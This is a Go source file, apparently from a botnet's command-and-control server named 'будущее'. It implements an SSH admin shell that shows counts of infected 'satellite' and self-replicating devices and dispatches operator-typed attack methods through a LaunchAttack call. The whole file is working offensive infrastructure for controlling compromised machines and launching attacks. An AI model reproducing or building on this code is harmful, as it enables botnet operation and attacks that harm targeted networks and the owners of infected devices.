package admin

import (
	"admin/source/admin/commands"
	"admin/source/attacks"
	"admin/source/terminal"
	"fmt"
	"runtime"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/exp/maps"
	"golang.org/x/exp/slices"
)

var Operators int = 0

// NewAdminPage creates a new admin page for the given connection
func NewAdminPage(channel ssh.Channel, conn *ssh.ServerConn) error {
	newTerm := terminal.NewTerminal(channel, conn)

	// Checks for lockdown mode
	if commands.Lockdown && !slices.Contains(maps.Keys(conn.Permissions.CriticalOptions), "admin") {
		newTerm.Clear()
		newTerm.Write([]byte("\x1b[0mбудущее is currently in lockdown! come back later"))
		time.Sleep(10 * time.Second)
		return nil
	}

	cancel := make(chan struct{})
	go func() { // Title worker routine
		ticker := time.NewTicker(1 * time.Second)
		for {
			select {
			case <-ticker.C: // new title update
				newTerm.Write([]byte(fmt.Sprintf("\033]0; Satellites: %d | Operators: %d | Selfrepping devices: %d | %d\007", len(attacks.Devices), Operators, attacks.SelfreppingDevices(), runtime.NumGoroutine())))
			case <-cancel: // Kill routine
				return
			}
		}
	}()

	Operators++

	// Kill title worker
	defer SendClose(cancel)

	newTerm.Clear()
	newTerm.Write([]byte("\x1b[38;5;10mauthenticated\x1b[38;5;15m successfully into будущее!\x1b[38;5;15m\r\n\r\n"))

	for {
		var prompt string = fmt.Sprintf("\x1b[38;5;15m%s"+newTerm.Colour+"@\x1b[38;5;15mбудущее"+newTerm.Colour+"$ \x1b[38;5;15m", conn.User())
		if slices.Contains(maps.Keys(conn.Permissions.CriticalOptions), "admin") {
			prompt = fmt.Sprintf("\x1b[38;5;15m%s"+newTerm.Colour+"@\x1b[38;5;15mбудущее"+newTerm.Colour+"~/\x1b[38;5;15madmin"+newTerm.Colour+"$ \x1b[38;5;15m", conn.User())
		}

		taken, err := newTerm.ReadLine(prompt, 61, false, "")
		if err != nil {
			return err
		}

		if len(taken) <= 0 {
			continue
		}

		// Checks for method and launchs the attack acordingly
		if _, ok := attacks.IsMethod(strings.Split(taken, " ")[0]); ok {
			attacks.LaunchAttack(newTerm, conn, strings.Split(taken, " ")); continue
		}
		
		// Indexes the command inside the command map
		cmd, err := commands.IndexCommand(strings.ToLower(strings.Split(taken, " ")[0]), conn.Permissions)
		if err != nil || cmd == nil {
			continue
		}

		// Executes the command
		if err := cmd.Execute(conn, newTerm, strings.Split(taken, " ")[1:]); err != nil {
			continue
		}
	}
}

func SendClose(cancel chan struct{}) {
	cancel <- struct{}{}
	Operators--
}